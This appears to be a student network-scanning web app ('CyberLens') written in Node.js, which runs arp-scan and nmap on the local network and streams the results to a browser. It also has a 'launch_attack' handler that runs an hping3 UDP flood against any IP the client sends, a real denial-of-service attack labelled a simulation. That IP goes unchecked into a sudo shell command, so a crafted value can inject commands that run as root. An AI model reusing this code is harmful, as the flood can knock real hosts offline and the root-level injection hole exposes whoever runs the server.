const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { exec } = require('child_process');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

let isScanning = false;

app.use(express.static('public'));

io.on('connection', (socket) => {
    socket.on('start_scan', () => {
        if (isScanning) return;
        isScanning = true;

        exec('sudo arp-scan --localnet --retry=2', (error, stdout) => {
            if (error) { isScanning = false; return; }

            const lines = stdout.split('\n');
            const targets = [];
            lines.forEach(line => {
                const match = line.match(/^(\d+\.\d+\.\d+\.\d+)\s+([a-fA-F0-9:-]+)\s+(.*)/);
                if (match) targets.push(match);
            });

            if (targets.length === 0) { isScanning = false; return; }

            let doneCount = 0;
            targets.forEach(m => {
                // Sifet ma3loumat lawla li lqa arp-scan
                socket.emit('device_found', { 
                    ip: m[1], 
                    mac: m[2].toUpperCase(), 
                    name: m[3] ? m[3].trim() : "Unknown Hardware" 
                });

                // Deep Scan b Nmap: -Pn (No Ping) bach n-slla7o "System Hidden" dyal Windows Firewall
                // -sV (Service Version) bach n-jbdo l-Protocols
                exec(`sudo nmap -Pn -O --osscan-guess -sV --max-rtt-timeout 200ms ${m[1]}`, (err, nmapOut) => {
                    doneCount++;
                    
                    let os = "System Hidden";
                    let ports = [];
                    let protocols = [];
                    let nmapVendor = "";

                    if (!err && nmapOut) {
                        // Extract Vendor (Ila malqahch Arp-scan, nmap kayjibo mn MAC)
                        const macMatch = nmapOut.match(/MAC Address: [0-9A-F:]+ \((.+?)\)/i);
                        if (macMatch) nmapVendor = macMatch[1];

                        // Extract OS (Robust fallback)
                        const osM = nmapOut.match(/OS details: (.*?)\n/) || 
                                    nmapOut.match(/Aggressive OS guesses: (.*?)\n/) || 
                                    nmapOut.match(/Running: (.*?)\n/);
                                    
                        if (osM) {
                            os = osM[1].split(',')[0].replace(/(\(.*\))/g, "");
                        } else if (nmapOut.includes("OS: Windows") || nmapOut.includes("Service Info: OS: Windows")) {
                            os = "Windows (Firewalled)";
                        } else if (nmapOut.includes("Linux")) {
                            os = "Linux (Inferred)";
                        }

                        // Extract Ports & Protocols
                        // Nmap format: "80/tcp open http"
                        const portRegex = /^(\d+)\/(tcp|udp)\s+open\s+([^ \n]+)/gm;
                        let prt;
                        while ((prt = portRegex.exec(nmapOut)) !== null) {
                            ports.push(prt[1]);       // e.g., 80
                            protocols.push(prt[3]);   // e.g., http, ssh, ftp
                        }
                    }

                    // Sifet l-Update l-Frontend
                    socket.emit('device_updated', { 
                        ip: m[1], 
                        os: os, 
                        ports: ports.length ? ports.join(', ') : '', 
                        protocols: protocols.length ? [...new Set(protocols)].join(', ') : '',
                        nmapVendor: nmapVendor // Had l-vendor ghan-bdlo bih "Unknown" f UI
                    });

                    if (doneCount === targets.length) isScanning = false;
                });
            });
        });
    });

    socket.on('launch_attack', (ip) => {
        exec(`sudo hping3 --flood --udp -p 80 ${ip}`);
        console.log(`[CyberLens-ALERT] Attack Simulation triggered on ${ip}`);
    });
});

const PORT = 3000;
server.listen(PORT, () => console.log(`CyberLens PFE Live on http://localhost:${PORT}`));
